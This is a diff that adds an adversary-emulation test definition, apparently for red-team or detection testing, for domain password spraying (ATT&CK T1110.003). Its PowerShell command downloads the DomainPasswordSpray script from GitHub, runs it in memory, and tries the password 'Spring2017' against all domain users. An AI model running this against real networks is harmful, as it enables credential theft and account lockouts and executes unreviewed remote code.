@@ -1,0 +1,16 @@
+- id: 40ac7afd-15a0-527b-aadd-bcd9f52108a1
+  name: Soumaia ART Tests - Password Spray (DomainPasswordSpray)
+  description: 'Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain
+
+
+    https://github.com/dafthack/DomainPasswordSpray'
+  tactic: credential-access
+  technique:
+    attack_id: T1110.003
+    name: 'Brute Force: Password Spraying'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain $Env:USERDOMAIN -Force
